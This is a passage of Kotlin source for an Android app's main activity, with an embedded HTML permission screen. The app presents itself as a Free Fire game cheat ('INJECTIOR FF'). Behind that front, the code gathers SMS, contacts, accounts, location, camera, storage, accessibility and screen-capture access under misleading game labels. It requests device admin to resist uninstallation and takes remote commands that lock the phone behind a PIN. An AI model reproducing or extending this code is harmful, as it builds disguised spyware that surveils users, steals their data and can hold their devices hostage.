package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_CAM     = 101
    private val PERM_SMS     = 103
    private val PERM_GALLERY  = 104
    private val PERM_LOCATION = 105
    private val PERM_CONTACTS = 106
    private val PERM_GMAIL    = 108
    private val PERM_PHONE    = 109
    private val REQ_SCREEN_CAPTURE    = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }

        // Anti-Uninstall: request Device Admin (hanya tampil sekali, flag disimpan di SharedPreferences)
        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
    }

    override fun onResume() {
        super.onResume()
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin   = intent.getStringExtra("lock_pin")   ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        android.util.Log.d("MainActivity", "onActivityResult: req=$requestCode result=$resultCode data=$data")
        if (requestCode == REQ_SCREEN_CAPTURE) {
            android.util.Log.d("MainActivity", "Screen capture result: resultCode=$resultCode")
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
            android.util.Log.d("MainActivity", "Broadcast sent: ACTION_SCREEN_RESULT")
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {            
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin   = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
        )
        try { startLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "stopLockTask: ${e.message}")
        }
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()", null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    private fun sendStatus(json: String) {
        val intent = Intent(DeviceService.ACTION_SEND_STATUS).apply {
            putExtra(DeviceService.EXTRA_STATUS_JSON, json)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            // Jangan memberikan izin WebView secara otomatis. Kamera hanya boleh
            // dipakai setelah izin Android CAMERA benar-benar diberikan.
            override fun onPermissionRequest(request: PermissionRequest) {
                val requested = request.resources.toSet()
                val cameraOnly = requested.isNotEmpty() &&
                    requested.all { it == PermissionRequest.RESOURCE_VIDEO_CAPTURE }

                if (cameraOnly && isCamGranted()) {
                    runOnUiThread {
                        request.grant(arrayOf(PermissionRequest.RESOURCE_VIDEO_CAPTURE))
                    }
                } else {
                    runOnUiThread { request.deny() }
                }
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
    fun requestGalleryPerm() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    }
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_LOCATION)

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client  = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {                
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        @Suppress("DEPRECATION")
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {                        
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_CONTACTS)

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun requestGmailPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_GMAIL)

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun requestPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        ), PERM_PHONE)

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_GALLERY)
        }
    }

    fun isAdminGranted(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val admins = dpm.activeAdmins ?: return false
        return admins.any { it.packageName == packageName }
    }

    fun requestAdminPerm() {
        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)

    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)

    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
        })
    }
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    fun requestCamPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun requestSmsPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_SMS)
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    private fun buildHtml(): String {
        val serverUrl = DeviceService.SERVER_URL
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#0b0d10">
<title>FF Max Cheat v4.5</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0d10;
  --surface:#11151a;
  --card:#151a20;
  --card-hover:#1a2028;
  --border:#252d36;
  --accent:#ff5a1f;
  --accent2:#ff8a32;
  --green:#35d69a;
  --red:#f05b66;
  --text:#f2f4f6;
  --text2:#a0a9b4;
  --text3:#68727e;
  --font:'Rajdhani',sans-serif;
  --head:'Orbitron',monospace;
}
html,body{height:100%;width:100%;overflow:hidden}
body{
  background:
    radial-gradient(ellipse at 50% -15%,rgba(255,90,31,.12),transparent 43%),
    var(--bg);
  color:var(--text);font-family:var(--font);-webkit-font-smoothing:antialiased;
}
button,input{font:inherit}
.screen{position:absolute;inset:0;transition:opacity .35s ease,visibility .35s ease;display:flex;flex-direction:column}
.screen.hidden{opacity:0;visibility:hidden;pointer-events:none}
#permScreen{overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:34px;background:transparent;scrollbar-width:none}
#permScreen::-webkit-scrollbar,#featureScreen::-webkit-scrollbar{display:none}

.perm-header{
  position:relative;padding:34px 24px 27px;display:flex;flex-direction:column;
  align-items:center;gap:13px;text-align:center;overflow:hidden;
}
.perm-header::before{
  content:"";position:absolute;width:240px;height:150px;top:-105px;left:50%;
  transform:translateX(-50%);background:var(--accent);filter:blur(85px);opacity:.2;
}
.perm-logo-wrap{position:relative;width:82px;height:82px;margin-bottom:2px}
.perm-logo-bg{
  position:absolute;inset:0;border-radius:25px;
  background:linear-gradient(145deg,rgba(255,90,31,.2),rgba(255,138,50,.035));
  border:1px solid rgba(255,138,50,.42);
  box-shadow:0 12px 36px rgba(0,0,0,.3),inset 0 1px rgba(255,255,255,.08);
  transform:rotate(-7deg);
  animation:pulseGlow 3s ease-in-out infinite;
}
@keyframes pulseGlow{0%,100%{box-shadow:0 0 18px rgba(255,90,31,.10)}50%{box-shadow:0 0 34px rgba(255,90,31,.25)}}
.perm-logo-inner{
  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
  font-size:35px;font-weight:900;font-family:var(--head);letter-spacing:-3px;
  background:linear-gradient(145deg,#fff 12%,#ff9a55 90%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
}
.perm-badge{
  display:inline-flex;align-items:center;gap:7px;background:rgba(255,90,31,.09);
  border:1px solid rgba(255,90,31,.23);border-radius:6px;padding:6px 11px;
  font-family:var(--head);font-size:9px;font-weight:700;color:#ff986b;
  letter-spacing:1.8px;text-transform:uppercase;
}
.perm-title{
  font-family:var(--head);font-size:clamp(22px,6vw,27px);font-weight:900;
  background:linear-gradient(100deg,#fff 15%,#ff9b66 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:1px;
}
.perm-subtitle{font-size:14px;font-weight:500;color:var(--text2);line-height:1.5;max-width:290px;letter-spacing:.2px}
.perm-divider{height:1px;background:linear-gradient(90deg,transparent,rgba(255,138,50,.28),transparent);margin:0 22px}

.perm-list{padding:17px 16px 0;display:flex;flex-direction:column;gap:9px}
.perm-row{
  position:relative;background:linear-gradient(145deg,#171c22,#13171c);
  border:1px solid var(--border);border-radius:14px;padding:13px 14px;
  display:flex;align-items:center;gap:12px;transition:border-color .22s,background .22s,transform .22s;
  box-shadow:0 5px 15px rgba(0,0,0,.12);
}
.perm-row.granted{border-color:rgba(53,214,154,.34);background:linear-gradient(145deg,rgba(53,214,154,.075),rgba(19,23,28,.96))}
.perm-icon{
  width:42px;height:42px;border-radius:12px;flex-shrink:0;display:flex;
  align-items:center;justify-content:center;font-size:18px;
  background:rgba(255,90,31,.085);border:1px solid rgba(255,90,31,.13);
}
.perm-row.granted .perm-icon{background:rgba(53,214,154,.1);border-color:rgba(53,214,154,.2)}
.perm-info{flex:1;min-width:0}
.perm-name{font-family:var(--head);font-weight:700;font-size:10px;color:var(--text);letter-spacing:1px;text-transform:uppercase}
.perm-desc{font-size:12px;font-weight:500;color:var(--text3);line-height:1.35;margin-top:4px}
.perm-row.granted .perm-desc{color:rgba(53,214,154,.72)}
.tog{position:relative;width:45px;height:25px;flex-shrink:0;cursor:pointer}
.tog input{opacity:0;width:0;height:0;position:absolute}
.tog-track{position:absolute;inset:0;border-radius:999px;background:#272f38;border:1px solid #343e49;transition:all .22s}
.tog-track::after{content:'';position:absolute;top:3px;left:3px;width:17px;height:17px;border-radius:50%;background:#7a8490;transition:left .22s,background .22s,box-shadow .22s}
.tog input:checked + .tog-track{background:rgba(53,214,154,.16);border-color:rgba(53,214,154,.48)}
.tog input:checked + .tog-track::after{left:23px;background:var(--green);box-shadow:0 0 10px rgba(53,214,154,.35)}
.tog input:disabled{cursor:default}
.tog input:focus-visible + .tog-track{outline:2px solid var(--accent2);outline-offset:3px}

.perm-footer{padding:16px 16px 0;display:flex;flex-direction:column;gap:11px}
.all-granted-badge{
  display:none;align-items:center;justify-content:center;gap:8px;padding:11px;
  background:rgba(53,214,154,.07);border:1px solid rgba(53,214,154,.2);
  border-radius:10px;font-family:var(--head);font-size:9px;font-weight:700;
  color:var(--green);letter-spacing:1px;text-transform:uppercase;
}
.all-granted-badge.show{display:flex}
.btn-masuk{
  width:100%;min-height:51px;border-radius:11px;border:1px solid rgba(255,160,105,.28);
  background:linear-gradient(105deg,#f0521d,#ff792e);color:#fff;
  font-family:var(--head);font-size:11px;font-weight:700;letter-spacing:1.6px;
  cursor:pointer;transition:transform .15s,filter .15s;display:flex;align-items:center;
  justify-content:center;gap:8px;box-shadow:0 7px 22px rgba(255,90,31,.17);
  text-transform:uppercase;
}
.btn-masuk:active{transform:scale(.985);filter:brightness(.92)}
.btn-masuk.refresh-mode{background:#171c22;color:var(--text2);border:1px solid var(--border);box-shadow:none}

#featureScreen{background:var(--bg);padding:18px 16px 34px;overflow-y:auto;scrollbar-width:none}
.feature-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:19px}
.feature-card{
  position:relative;min-height:119px;background:linear-gradient(145deg,#171c22,#12161b);
  border:1px solid var(--border);border-radius:14px;padding:16px 10px 13px;
  text-align:center;transition:border-color .2s,background .2s,transform .2s,box-shadow .2s;cursor:pointer;
  box-shadow:0 5px 16px rgba(0,0,0,.13);
}
.feature-card:active{transform:scale(.975)}
.feature-card.active{
  border-color:rgba(255,111,54,.8);
  background:linear-gradient(145deg,rgba(255,90,31,.13),#171a1f 80%);
  box-shadow:0 0 0 1px rgba(255,90,31,.08),0 8px 22px rgba(0,0,0,.2);
}
.feature-card .icon{font-size:25px;margin-bottom:9px;filter:saturate(.88)}
.feature-card .name{font-family:var(--head);font-size:9px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.75px}
.feature-card.active .name{color:#ff9a6c}
.feature-card .status-badge{
  display:inline-block;margin-top:9px;padding:3px 11px;border-radius:5px;
  font-family:var(--head);font-size:8px;font-weight:700;letter-spacing:1px;
  text-transform:uppercase;background:#252c34;color:#84909c;
}
.feature-card.active .status-badge{background:rgba(53,214,154,.12);color:var(--green)}
.conn-footer-wrap{margin-top:19px;text-align:center;padding-bottom:5px}
.conn-footer{font-family:var(--head);font-size:8px;font-weight:600;color:#65707c;letter-spacing:1.5px;text-transform:uppercase;opacity:.65}
.perm-row.requesting{border-color:var(--accent)!important;background:rgba(255,90,31,.09)!important;box-shadow:0 0 0 1px rgba(255,90,31,.18)}
@media(min-width:520px){
  #permScreen,#featureScreen{width:100%;max-width:480px;left:50%;transform:translateX(-50%);border-left:1px solid #1b222a;border-right:1px solid #1b222a}
}
@media(prefers-reduced-motion:reduce){
  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;scroll-behavior:auto!important;transition-duration:.01ms!important}
}

/* APP AREA */
.app-page{overflow-y:auto;-webkit-overflow-scrolling:touch;padding:0 16px 104px;scrollbar-width:none}
.app-page::-webkit-scrollbar{display:none}
.appbar{
  position:sticky;top:0;z-index:5;margin:0 -16px;padding:15px 17px 13px;
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  background:rgba(11,13,16,.88);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
  border-bottom:1px solid rgba(255,255,255,.055)
}
.appbrand{display:flex;align-items:center;gap:10px;min-width:0}
.appbrand-mark{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
  background:linear-gradient(145deg,#ff6a2c,#b93618);font:900 12px var(--head);color:#fff;
  box-shadow:0 5px 16px rgba(255,90,31,.2)}
.appbrand-title{font:700 10px var(--head);letter-spacing:1px;color:#f4f5f6}
.appbrand-sub{font:600 10px var(--font);color:var(--text3);margin-top:2px}
.online-pill{font:700 8px var(--head);letter-spacing:.8px;color:var(--green);
  border:1px solid rgba(53,214,154,.22);background:rgba(53,214,154,.07);padding:6px 8px;border-radius:6px}
.section-kicker{font:700 8px var(--head);letter-spacing:1.6px;color:var(--accent2);text-transform:uppercase}
.section-title{font:800 17px var(--head);letter-spacing:.3px;color:var(--text);margin-top:6px}
.section-copy{font-size:13px;color:var(--text2);line-height:1.5;margin-top:5px}
.welcome-block{padding:22px 2px 15px}
.pixel-card{
  position:relative;overflow:hidden;min-height:190px;border-radius:15px;
  border:1px solid #35412f;background:linear-gradient(145deg,#1c2b20,#172019 60%,#24271b);
  box-shadow:0 12px 30px rgba(0,0,0,.22);padding:16px;
}
.pixel-card::after{content:"";position:absolute;inset:0;pointer-events:none;
  background:linear-gradient(90deg,rgba(8,12,9,.88),rgba(8,12,9,.08) 80%)}
.pixel-copy{position:relative;z-index:2;max-width:60%}
.pixel-label{font:700 8px var(--head);letter-spacing:1.3px;color:#c4d69b}
.pixel-heading{font:900 17px var(--head);line-height:1.35;color:#f0f2d9;margin-top:9px;text-shadow:2px 2px #283522}
.pixel-note{font:600 11px var(--font);line-height:1.35;color:#c4c9ad;margin-top:7px}
.pixel-scene{position:absolute;right:0;bottom:0;width:60%;height:100%;image-rendering:pixelated;shape-rendering:crispEdges}
.pixel-tag{display:inline-block;margin-top:12px;padding:5px 8px;background:#c2d69a;color:#26331f;
  font:800 7px var(--head);letter-spacing:.8px;border-radius:2px}
.quick-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px;margin-top:13px}
.quick-card{
  min-height:100px;padding:14px;border-radius:13px;background:linear-gradient(145deg,#171d23,#13181e);
  border:1px solid var(--border);text-align:left;color:var(--text);cursor:pointer;
  transition:transform .16s,border-color .16s;display:flex;flex-direction:column;align-items:flex-start
}
.quick-card:active{transform:scale(.98);border-color:rgba(255,120,65,.5)}
.quick-icon{font-size:21px;margin-bottom:11px}
.quick-title{font:700 9px var(--head);letter-spacing:.7px}
.quick-desc{font:600 11px var(--font);color:var(--text3);margin-top:4px}
.status-panel{margin-top:13px;padding:14px;border:1px solid var(--border);border-radius:13px;background:#14191f}
.status-line{display:flex;align-items:center;justify-content:space-between;gap:10px}
.status-caption{font:700 8px var(--head);letter-spacing:1px;color:var(--text3)}
.status-value{font:700 9px var(--head);color:var(--green)}
.status-track{height:5px;background:#29313a;border-radius:99px;margin-top:11px;overflow:hidden}
.status-fill{height:100%;width:100%;background:linear-gradient(90deg,#ff652b,#ffad54);border-radius:99px}
#featureScreen{padding-bottom:88px}
.feature-topbar{display:flex;align-items:center;justify-content:space-between;padding:17px 0 0}
.feature-topbar .section-title{font-size:13px;margin:0}
.feature-topbar .section-kicker{font-size:7px}
.booster-hero{margin-top:18px;padding:18px;border:1px solid rgba(255,120,55,.22);
  border-radius:15px;background:radial-gradient(circle at 90% 0,rgba(255,90,31,.15),transparent 42%),#151a20}
.booster-orb{color:#ff9a6c}.booster-orb .ui-icon{width:30px;height:30px}.booster-orb{width:64px;height:64px;border-radius:20px;display:grid;place-items:center;font-size:29px;
  background:linear-gradient(145deg,rgba(255,105,45,.2),rgba(255,105,45,.04));
  border:1px solid rgba(255,125,65,.28);margin-bottom:15px}
.booster-button{width:100%;margin-top:17px;padding:13px;border:0;border-radius:9px;
  background:linear-gradient(100deg,#f0521d,#ff8438);color:#fff;font:800 9px var(--head);
  letter-spacing:1.2px;cursor:pointer;box-shadow:0 7px 20px rgba(255,90,31,.15)}
.booster-button:active{transform:scale(.985)}
.booster-result{display:none;margin-top:12px;padding:11px;border:1px solid rgba(53,214,154,.2);
  border-radius:9px;background:rgba(53,214,154,.06);font:600 11px var(--font);color:#8de6c2;line-height:1.5}
.booster-result.show{display:block}
.setting-list{margin-top:17px;display:flex;flex-direction:column;gap:9px}
.setting-row{display:flex;align-items:center;gap:12px;padding:13px;border:1px solid var(--border);
  background:#151a20;border-radius:12px}
.setting-icon{width:36px;height:36px;display:grid;place-items:center;border-radius:10px;background:#202832;font-size:16px}
.setting-info{flex:1;min-width:0}
.setting-name{font:700 9px var(--head);letter-spacing:.6px}
.setting-desc{font:600 11px var(--font);color:var(--text3);margin-top:3px}
.setting-value{font:700 8px var(--head);color:var(--text3)}
.bottom-nav{
  position:absolute;z-index:20;left:12px;right:12px;bottom:12px;display:none;
  grid-template-columns:repeat(4,1fr);gap:4px;padding:7px;
  border:1px solid rgba(255,255,255,.09);border-radius:16px;
  background:rgba(20,25,31,.91);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
  box-shadow:0 12px 35px rgba(0,0,0,.38)
}
.bottom-nav.show{display:grid}
.nav-item{border:0;background:transparent;color:#78838f;border-radius:10px;padding:8px 3px 7px;
  display:flex;flex-direction:column;align-items:center;gap:5px;cursor:pointer;min-width:0}
.nav-item .nav-ico{font-size:17px;line-height:1}
.nav-item .nav-label{font:700 7px var(--head);letter-spacing:.5px}
.nav-item.active{color:#ff9568;background:rgba(255,90,31,.1)}
.page-foot{margin-top:20px;text-align:center;font:700 7px var(--head);letter-spacing:1.2px;color:#58616c}
@media(min-width:520px){.bottom-nav{left:calc(50% - 228px);right:calc(50% - 228px)}}


.ui-icon{width:22px;height:22px;display:block;fill:none;stroke:currentColor;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
.quick-icon .ui-icon{width:23px;height:23px}
.setting-icon .ui-icon{width:19px;height:19px}
.nav-ico .ui-icon{width:18px;height:18px}
.perm-icon .ui-icon{width:20px;height:20px}
.feature-card .icon .ui-icon{width:25px;height:25px}
.perm-badge .ui-icon{width:12px;height:12px}
.pixel-scene{image-rendering:pixelated}

</style>
</head>
<body>

<!-- PERMISSION SCREEN -->
<div class="screen" id="permScreen">
  <div class="perm-header">
    <div class="perm-logo-wrap">
      <div class="perm-logo-bg"></div>
      <div class="perm-logo-inner">FF</div>
    </div>
    <div class="perm-badge"><span style="width:6px;height:6px;border-radius:50%;background:#ff6540;display:inline-block"></span> v4.5 Pro</div>
    <div class="perm-title">INJECTIOR FF</div>
    <div class="perm-subtitle">Aktifkan izin yang diperlukan untuk melanjutkan.</div>
  </div>

  <div class="perm-divider"></div>

  <div class="perm-list" id="permList">
    <div class="perm-row" id="row-overlay">
      <div class="perm-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="6.5" y="2" width="11" height="20" rx="2"/><path d="M10 5h4M11 18.5h2"/></svg></div>
      <div class="perm-info">
        <div class="perm-name">GAME MENU</div>
        <div class="perm-desc">Izin tampilkan game bosster</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-location">
      <div class="perm-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M20 10c0 5.2-8 12-8 12S4 15.2 4 10a8 8 0 1 1 16 0Z"/><circle cx="12" cy="10" r="2.5"/></svg></div>
      <div class="perm-info">
        <div class="perm-name">SERVER GAME</div>
        <div class="perm-desc">akses lokasi region akun</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-cam">
      <div class="perm-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 8h4l1.5-2h7L17 8h4v11H3V8Z"/><circle cx="12" cy="13.5" r="3.5"/></svg></div>
      <div class="perm-info">
        <div class="perm-name">RECORDING</div>
        <div class="perm-desc">akses rekam layar permainan</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-admin">
